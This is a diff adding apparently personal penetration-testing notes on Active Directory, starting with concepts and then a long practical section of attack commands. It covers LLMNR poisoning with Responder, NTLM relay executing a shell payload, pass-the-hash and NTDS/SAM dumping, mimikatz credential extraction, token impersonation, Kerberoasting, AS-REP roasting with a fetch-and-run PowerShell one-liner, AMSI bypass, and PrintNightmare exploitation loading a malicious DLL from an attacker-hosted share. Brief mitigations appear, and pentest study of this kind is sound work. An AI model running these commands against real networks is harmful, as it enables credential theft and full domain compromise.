@@ -1,1 +1,1126 @@
+Resources :
+https://adsecurity.org/
+https://book.hacktricks.xyz/windows/active-directory-methodology
+
+AD DS
+The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:
+
+Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
+Stored by default in %SystemRoot%\NTDS
+accessible only by the domain controller
+
+﻿Forest Overview
+﻿﻿A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.
+The Forest consists of these parts:
+
+Trees - A hierarchy of domains in Active Directory Domain Services
+Domains - Used to group and manage objects 
+Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
+Trusts - Allows users to access resources in other domains
+Objects - users, groups, printers, computers, shares
+Domain Services - DNS Server, LLMNR, IPv6
+Domain Schema - Rules for object creation      
+
+Users Overview
+﻿Users are the core to Active Directory, there are four main types of users you'll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are:
+
+Domain Admins - This is the gem: they control the domains and are the only ones with access to the domain controller.
+Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
+Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
+Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.
+
+Groups Overview
+﻿Groups make it easier to give permissions to users and objects by organizing them into groups with specified permissions. There are two overarching types of Active Directory groups:
+
+Security Groups - These groups are used to specify permissions for a large number of users
+Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
+
+Default Security Groups
+﻿Here is a brief outline of the security groups:
+
+Domain Controllers - All domain controllers in the domain
+Domain Guests - All domain guests
+Domain Users - All domain users
+Domain Computers - All workstations and servers joined to the domain
+Domain Admins - Designated administrators of the domain
+Enterprise Admins - Designated administrators of the enterprise
+Schema Admins - Designated administrators of the schema
+DNS Admins - DNS Administrators Group
+DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
+Group Policy Creator Owners - Members in this group can modify group policy for the domain
+Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
+Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
+Cert Publishers - Members of this group are permitted to publish certificates to the directory
+Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
+Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
+Key Admins - Members of this group can perform administrative actions on key objects within the domain.
+Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
+Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
+RAS and IAS Servers - Servers in this group can access remote access properties of users   
+
+Domain Trusts Overview
+﻿Trusts are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases.
+
+There are two types of trusts that determine how the domains communicate. The two types of trusts below:
+
+Directional - The direction of the trust flows from a trusting domain to a trusted domain
+Transitive - The trust relationship expands beyond just two domains to include other trusted domains
+
+The type of trusts put in place determines how the domains and trees in a forest are able to communicate and send data to and from each other when attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network.
+
+Domain Policies Overview -
+Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I'll outline just a few of the many policies that are default or you can create in an Active Directory environment:
+
+Disable Windows Defender - Disables windows defender across all machine on the domain
+Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller
+
+Domain Services
+Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. 
+There is a wide range of various services that can be added to a domain controller;
+LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
+Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
+DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames  
+
+Domain Authentication Overview -
+The most important part of Active Directory -- as well as the most vulnerable part of Active Directory -- is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos.
+
+Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
+NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol   
+
+#Kerberos Pentesting
+https://www.tarlogic.com/blog/how-to-attack-kerberos/
+
+What is Kerberos? -
+Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.
+
+Common Terminology -
+Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
+Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
+Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
+Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
+Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
+KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
+Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
+Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
+Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
+Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
+
+AS-REQ w/ Pre-Authentication In Detail -
+
+The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.
+
+Ticket Granting Ticket Contents -
+
+In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.
+
+Service Ticket Contents -
+
+To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.
+
+Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
+User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.
+
+Kerberos Authentication Overview -
+
+AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
+
+AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
+
+TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
+
+TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
+
+AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
+
+AP-REP - 6.) The service grants access
+
+Kerberos Tickets Overview -
+
+The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.
+
+Attack Privilege Requirements -
+
+Kerbrute Enumeration - No domain access required 
+Pass the Ticket - Access as a user to the domain required
+Kerberoasting - Access as any user required
+AS-REP Roasting - Access as any user required
+Golden Ticket - Full domain compromise (domain admin) required 
+Silver Ticket - Service hash required 
+Skeleton Key - Full domain compromise (domain admin) required
+
+Practical Portion starts here
+Attacking Actice Directory (Initial approach-meaning we only need to be on the same network as AD environment)
+
+summary
+
+    start responder and mitm6 in the network
+    scan and sweep the network range for hosts and open ports
+    find open websites ,use http_version msf module for stealthy sweep
+    try default credentials in printers,web logins etc and try to gain access from there
+
+LLMNR/NBT-NS poisoning
+
+This attack happens when any user or computer request a resource or ip which the network dns fails to resolve(Meaning they either mistyped or requesting non existing resource).LLMNR is a Windows AD feature which tries to resolve request when DNS fails..We as an attacker can respond to the user using a tool called responder and act as a LLMNR server.LLMNR key flaw is that it requires user hash to work.We request users hash from the user and say we will resolve their request and this way we perform a mitm attack inside a AD network
+
+NOte: This attack assumes we have network access same as the target
+
+    Run responder
+
+    responder -I interface(eth0,tun0 etc) -rdw
+
+    Assume a user on the network tries to connect to a wrong smb share ,we will act as a llmnr server because dns fails and get the hash
+
+    \shre
+
+    we get the hash and now can crack it ,pass the hash etc
+
+Defense against LLMNR poisoning:
+
+    Disable LLMNR and NBT-NS
+    If LLMNR is required by the company ,then enforce NAC or network access control which means that only the devices with authorized MAC addresses can connect to the internal network.
+    Set comnplex Password policy so captured hash cannot be cracked easily
+
+Url File Attacks (requires access to a domain machine and a writabele share)
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
+
+In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share.We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
+
+    create a file with following text and name it like "@anyname.url"
+
+[InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\AttackerIP%USERNAME%.icon IconIndex=1
+
+    Now we run responder and wait for the file to be opened
+
+    responder -I eth0 -rdw
+
+SMB Relay attack
+
+In this attack we utilize llmnr poisoning and then use the captured hashes to dump sensitive critical information on other machines in the network.We utilize responder and ntlmrelay tool. Requirement for this is that smb signing must be disabled on target and the hash of the user which we captured,must be admin on the target machine.
+
+    We need to narrow down all the targets which have smb signing disabled or enabled but are not required for logging in.
+
+    nmap --script=smb2-security-mode.nse -p445
+
+    Edit the /etc/responder/Responder.conf file to disable smb and http flags to off
+
+    run responder
+
+    responder -I interface -rdw
+
+    now run ntlmrelay
+
+    ntlmrelayx.py -tf targetlist.txt -smb2support
+
+    Now any user must cause the llmnr attack and our smb relay attack will work
+
+    We will receive SAM hashes and hives etc.
+
+                OR
+
+when running ntlm relay we can specify -i flag to get a interactive session.Then we nc into that specific local port and get bunch of feauturs.
+
+    ntlmrelayx.py -tf targetlist.txt -smb2support -i
+
+We can also specify -e to execute an executable when succesful.We can create a msfvenom exe payload and and specify that and get a meterpreter shell or any common shell
+
+    ntlmrelayx.py -tf targetlist.txt -smb2support -e shell.exe
+
+Mitigation:
+
+    enable smb signing on every device across the network
+    Disable ntlm authentication on the network(kerberos more secure)
+    Limit local administrators across the network(a admin of single workstation is also admin of many other workstations which allows this attack)
+
+Gain authenticated access in domain
+
+We can use smbexec,wmiexec,psexec using the gained credentials for a semi interactive shell.Then we can find a way to gain a interactive shell or pipe a C2 Framework like empire for persistence or post exploitation.psexec is noisy and should be as a last resort
+
+NOTE: We can also use hashes instead of password
+
+    smbexec.py domain/username:password@IPADDRESS
+    OR smbexec.py domain/username@IPADDRESS -hashes FullHash (same syntax for below)
+
+    wmiexec.py domain/username:password@IPADDRESS
+
+    psexec.py domain/username:password@IPADDRESS
+
+IPV6 DNS TAKEOVER
+
+Most of the AD networks dont have dns server setup for ipv6 and we can act as a ipv6 dns server (mitm) and can dump important information like users,groups,policies,computers ,user descriptions(might contain password etc) meaning this attack is highly critical and expose the domain sensitive information
+
+By default every device in the network check up with ipv6 dns every 30 mins or after every restart.so we may need to wait 30 mins in real scenairo or can simulate a restart in lab env
+
+    First run mitm6
+
+    mitm6 -d domainname
+
+    Now run ntlmrelayx
+
+    ntlmrelayx.py -6 -t ldaps://DCIP -wh fakewpad.domain.name -l lootdir
+
+When a domain admin logs in and we are active for this attack,ntlmrelayx automatically adds a new user and assign specific high level priveleges to that user,providing us solid persistence.
+Passback Attacks
+
+In this attack we target iot devices,or other devices in an organization like printers,smtp,etc. If we find a edit panel for printer setup , smtp setup etc,we can try using default credentials etc. Or if this device is connected to the LDAP service of the network it will be pointing itself to ldap server and port which is mostly on DC.so we can point the device towards our ip instead of ldap server and a port and then either listen on nc or use responder.
+
+shttps://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+Enumerating AD users without wordlists using crackmapexec (RID bruteforce)
+
+    crackmapexec smb $ip -u anonymous -p '' -d domain.name --rid-brute (anonymous login)
+
+we can also provide proper credentials for accurate info
+Enumerating AD users for kerberos attack (requires dc ip and wordlist)
+
+using tool called kerbrute
+
+To enumerate avalible users for kerberos authentication use command
+
+here dc is for domain controller and d is for domain. d is neccassary to specify
+
+    ./kerbrute userenum --dc IPdomaincontroller -d CONTROLLER.local WordLists/ADusers.txt
+
+If we have credentials of the machine then we can enumerate users more accurately with impacket
+
+    GetADUSers.py -all domain.name/USER:PASS@computername -dc-ip IPADDRESS
+
+Domain Info dump (Authenticated)
+
+we can get Entire users,froups,trusts info dumped if we have credentials for a domain user (does not need to be of higher privilege)
+
+    ldapdomaindump $ip -u 'domain.name\username' -p password
+
+Post Compromise Enumeration
+
+Once we have gained access in a machine from the network
+
+    Gather info using powerview
+    Map the AD environment by using bloodhound
+
+PowerView.ps1
+
+cheatsheet link : https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+First bypass powershell execution policy and then import powerview
+
+    powershell -ep bypass
+    . .\Powerview.ps1
+
+Get-DomainUser is used for whole domain and Get-NetUser for current Computer on which we have foothold
+domain info
+
+    Get-NetDomain
+
+Displays Domain controllers info
+
+    Get-NetDomainController
+
+Get list of Network info
+
+    Get-NetIPAddress
+
+Domain policy
+
+    Get-DomainPolicy
+
+We will get few objects and we can view detailed info by following command.for eg if we get some info about system access object ,we will insert the object name in below command
+
+    (Get-DomainPolicy."above command output")
+
+See open ports
+
+    Get-NetTCPConnection | where-Object -Property State -match listen
+
+Get Computer information in domain
+
+    Get-NetComputer -fulldata
+
+to get only OS on computers
+
+    Get-NetComputer -fulldata | select operatingsystem
+
+Get list of users on local machine
+
+    Get-LocalUser
+
+Get list of Users on domain
+
+    Get-NetUser
+
+To view only usernames
+
+    Get-NetUser | select cn
+
+Detecting Honeypots in the networks
+
+    Get-UserProperty -Properties logoncount
+
+Seeing which account has multiple retries in authetntication
+
+    Get-UserProperty -Properties badpwdcount
+
+Get all groupsname on domain
+
+    Get-NetGroup -GroupName *
+
+Get local groups of current machine
+
+    Get-NetLocalGroup SERVER.domain.local
+
+Get Service accounts passwords and info
+
+    Get-NetUser -SPN
+
+Or to get info about service account of specific group
+
+    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
+
+    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+
+    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}
+
+See recently applied patches
+
+    Get-HOtfix
+
+Find available shares
+
+    Invoke-ShareFinder
+
+Bloodhound
+
+BloodHound is used to create a mapping of Active directory environment which allows us as an attacker to better understand the posture of target infrastructure. It maps trusts,permissions , groups users and make our further pentesting more deep.
+
+We will be using a powershell script used to receive information from target known as SharpHound which is part of Bloodhound project
+
+    First run neo4j console on our machine
+
+    neo4j console credentials neo4j:neo4j
+
+go to localhost address and first click run button then add the above credentials which are default
+
+I changed on my machine neo4j : hello
+
+    Now on target we First bypasss powershell execution policy
+
+    powershell -ep bypass
+
+    Run SHarpHOund.ps1
+
+    . .\SharpHound.ps1
+
+    Now after importing the module in powershell session we will retreive all the info
+
+    Invoke-Bloodhound -CollectionMethod All -Domain domain.name -ZipFileName info.zip
+
+    Transfer the file back to our machine
+
+    Now type bloodhound on our machine
+
+    Give same credentials as neo4j neo4j : hello
+
+    NOw upload the zip file on bloodhound console
+
+    Now simply click analysis and click any type of query and we can see graph of AD
+
+    We can view varius types of permissions etc
+
+Post Compromise attacks (either have a shell or have credentials in the network)
+
+Once we are in a network computer or have set of credentials from previous attacks we can proceed with post compromise
+Pass the hash/password
+
+In this attack we simply pass the credentials in entire network range to see in how many devices we can logon(Password reuse). We can either use the hashes (last portion of ntlm hash) or plaintext password and pass em around using crackmapexec
+
+    NOTE:NTLM hashes can be passed but NTLMv2 hashes cannot be passed
+
+    NOTE: See all the available modules in crackmapexec ,they can be useful for post exploitation activities
+
+    passing hashes/passwords for a domain user
+
+    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname
+
+    passing hashes/passwords of local pc users
+
+    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password --local-auth
+
+-If we want to continue hash passing/password spraying , use the --continue-on-success flag
+
+    we can also use multiple other flags like dump sam,lsa secrets,ntds.dit etc
+
+    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname --sam or --lsa or --ntds
+
+We can also use modules in crackmap exec like mimikatz,powerview etc
+
+https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
+
+Enumerate all shares and its contents
+
+    crackmapexec smb IP-RANGE/ADDRESSES -u userame -H hash or password -d domain.name -M spider_plus
+
+    we can enumerate other things like users,shares,sessions etc
+
+    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password --shares or --users or --groups etc
+
+We can load powershell scripts in memory and obfuscate them
+
+Powershell Obfuscation:
+
+Options for PowerShell script obfuscation
+
+--obfs Obfuscate PowerShell scripts --clear-obfscripts Clear all cached obfuscated PowerShell scripts
+
+    crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M mimikatz --obfs
+
+We can also use empire framework module to get a agent back for a c2 channel. We can also add custom amsi bypass file
+
+    crackmapexec smb 192.168.125.133 -u fcastle -p 'Password1' -d HYDRA.local -M empire_exec -o LISTENER=final --amsi-bypass bypassfile
+
+    Mitigations
+
+    Avoid reusing local admin passwords across the network
+    only set privelges to user as they require (principle of least privilege)
+    Set strong complex password policy
+    use PAM and autorotate passwords on daily basis
+
+Dump Hashes in a network
+Remotely
+
+    we can use multiple flags like dump sam,lsa secrets,ntds.dit etc
+
+    crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname --sam or --lsa or --ntds
+
+we can try to dump ntds using two different methods
+
+    --ntds
+    --ntds vss (Volume shadow method)
+
+    secretsdump.py domain/username:password@IPADDRESS or secretsdump.py domain/username@IPADDRESS -H hash
+
+    secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS
+
+Or Locally in our machine by copying dumped SAM hives
+
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam samfile -system systemfile LOCAL
+
+    NTDS.dit Dumping
+
+Good resource= https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
+
+LOCALLY :
+
+If we have access to domain controller we can directly dump ntds.dit through powershell
+
+    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+
+This will dump a ntds and system hive in specified directory. We can then copy it back to our machine and dump hashes using secretsdump.py
+
+    /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
+
+REMOTELY:
+
+If we have valid credentials for a domain controller then we can dump all the hashes directly from our machine
+
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS crackmapexec smb IP-RANGE/ADDRESSES -u username -H hash or password -d domainname --ntds
+
+On Disk Using Mimikatz
+
+Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator contex
+
+    First open the mimikatz binary
+
+    Now type in following to get us system privileges on mimikatz shell
+
+privilege::debug token::elevate
+
+If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.
+
+    We can now dump the hashes using the follwoing command
+
+    lsadump::sam (FOR NORMAL windows)
+
+OR
+
+    sekurlsa::logonpasswords (Dump hashes from current active sessions)
+
+OR
+
+    lsadump::lsa /patch (for Windows AD server)
+
+Gain access in other machines
+
+We can use smbexec,wmiexec,psexec using the gained credentials for a semi interactive shell.Then we can find a way to gain a interactive shell or pipe a C2 Framework like empire for persistence or post exploitation.psexec is noisy and should be as a last resort
+
+NOTE: We can also use hashes instead of password
+
+    smbexec.py domain/username@IPADDRESS
+    OR smbexec.py domain/username@IPADDRESS -hashes FullHash (same syntax for below)
+
+    wmiexec.py domain/username@IPADDRESS
+
+    psexec.py domain/username@IPADDRESS
+
+Token Impersonation
+
+https://adsecurity.org/?page_id=1821#TOKENElevate https://steflan-security.com/linux-privilege-escalation-token-impersonation/
+
+Whenever a user logs in a machone,windows create a token called delegate token and injects into session.If we have got any access of the machine,we can steal the token and impersonate as that user.If a domain admin logs in the machine,then his token is also available and we can simply impersonate as domain admin using that token.We can then dump ntds.dit and own the domain.
+
+Advice : move from machine to machine and try to find domainadmins token for a easy final win.Try this attack in every machine we get access to
+
+NOTE:Local admin required
+
+Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator contex
+Using Mimikatz
+
+run mimikatz
+
+    run this command
+
+    token::elevate (impersonate local admin)
+
+or
+
+    token::elevate /domainadmin (impersonate domain admin)
+
+    NOw run
+
+    token::run /process:cmd.exe
+
+    Optional commands
+
+    ts::sessions (active sessions)
+
+    token::whoami (current user context)
+
+    token::list (see all available tokens)
+
+    token::revert (revert the token)
+
+assume we have a meterpreter shell on target(we can use psexec module to get meterpreter session)
+
+    now run
+
+    load incognito
+
+    now run
+
+    list_tokens -u
+
+3.Now we choose any user whos token available and impersonate
+
+    impersonate_token domain\username
+
+Mitigations:
+
+    Domain admins only access domain controllers,limiting attackers attack surface
+
+    Limit Local Admin restriction
+
+    Local Admin passwords must be complex and not same across the network
+
+Kerbroasting
+
+Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.
+
+If we are on the target and need to find all the spn accounts
+
+    setspn -T offense -Q /
+
+or some powerview cmdlets
+
+    Get-NetUser -SPN
+
+Or to get info about service account of specific group
+
+    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
+
+    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+
+    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}
+
+    Using Impacket
+
+This can be done remotely but for this we need a remote connection as any user on the target system
+
+controller.local is domain name , Machine1 is PC name and Password1 is a password
+
+    sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.234 -request
+
+    using rebeus
+
+This command will dump hashes of available service accounts
+
+    Rubeus.exe kerberoast (we can also specify specific user to target by adding /username:password in this command.also domain or domaincontroller)
+
+NOw copy the hash and crack in our machine
+
+What Can a Service Account do?
+
+After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.
+
+Mitigations:
+
+    Strong Complex passwords
+    Dont make service accounts domain admins
+
+AS-REP roasting (DUmping Users hashes ,pre authentication disabled)
+
+Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
+
+Rubeus automatically enumerate eligible users havingpre authrntication disabled whereas impacket requires us to give a list of users
+
+on target we can check which users have pre authentication disabled through powershell
+
+    get-aduser -filter * -properties DoesNotRequirePreAuth | where {$.DoesNotRequirePreAuth -eq "True" -and $.Enabled -eq "True"} | select Name
+
+Using PowerView.ps1
+
+    Get-DomainUser -PreauthNotRequired Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+
+    Using Impacket (REmotely without authentication)
+
+we require list of usernames on target. we can find those from kerbrute and supply here
+
+    Without AUthentication
+
+    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/ -dc-ip IPADDRESS -users kerbuser.txt -no-pass
+
+          With Authentication                                                    OR 
+
+    sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/Machine1:Password1 -dc-ip IPADDRESS -users kerbuser.txt
+
+    Using Rubeus
+
+using rubeus is prefereed because it automatically enumerate users
+
+    Rubeus.exe asreproast (we can also specify specific user to target by adding /username:password in this command. also domain or domaincontroller)
+
+            or
+
+    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
+
+GPO Abuse
+
+If we see GPO mentioned in bloodhound graph,then that means we can perform actions on behalf of that group policy object
+
+SharpGPOAbuse is an excellent tool for GP related attacks
+gpp attack (group policy preferences) MS14-025
+
+In this attack we utilize a windows misconfiguration in which we can read credentials which admin stores in a xml file named Groups.xml. This policy is stored in SYSVOL share which is readbale by every authenticated domain user to access policies etc we can get local admins and domain admins credentials which are utilizing the policies in SYSVOL share
+
+we get password in a cpassword type but we can decrypt it from kali or online because the key to this encryption was leaked from microsoft
+
+We can utilize metasploit module gpp enum to get passwords
+
+we can also use a powershell script called Get-GPPPassword
+
+    This command will give all cleartext passwords from the found SYSVOL share.Remember that we are interested in passwords from Groups.xml
+
+    Get-GPPPassword
+
+    This command will look for all SYSVOL shares for the entire domain
+
+    Get-GPPPassword -Server domain.name
+
+    This command will search whole forest by mapping out trusts and accessing the accessible SYSVOL shares
+
+    Get-GPPPassword -SearchForest
+
+    This will list out the found passwords only
+
+    Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
+
+If we get access of Groups.xml in any other way we can copy the password stored in cpassword variable and decrypt using a tool called gpp decrypt
+
+    gpp-decrypt passwordhash
+
+Url File Attacks
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
+
+In this attack we create a url file ,pointing towards our ip address and then upload this file to a writable share with a appropriate name starting with @ or - so that the file is on top when any user access that share.We run responder on our machine and then wait for any user to open the file and we can grab the hash just like we did before. This requires access to any domain machine
+
+    create a file with following text and name it like "@anyname.url"
+
+[InternetShortcut] URL=blah WorkingDirectory=blah IconFile=\AttackerIP%USERNAME%.icon IconIndex=1
+
+    Now we run responder and wait for the file to be opened
+
+    responder -I eth0 -rdw
+
+PrintNightmare CVE-2021-1675
+
+https://github.com/cube0x0/CVE-2021-1675
+
+This cve works because of the spooler service running in windows and currently it is not patched and only mitigation is to disable spooler service so we need this service running in order to exploit
+
+First we see if spooler service is running or not
+
+    Run following command in attacker machine and see if we get similiar results as shown
+
+rpcdump.py @TargetIp| egrep 'MS-RPRN|MS-PAR'
+
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol
+
+    Now we need a malicuius dll containing our code and a smb server running to host it
+
+    we create a dll from msffvenom or any other way and run impacket smb server to host it
+
+    Now we simply run the exploit remotely as shown in the github
+
+    ./CVE-2021-1675.py domain.name/domain_user:passsword@TargetIP '\OurIPAddress\smb\file.dll'
+
+ElevatedInstaller exploit (cve-2021-41379)
+PrintSpooler
+
+##Zero logon
+Golden and silver tickets
+
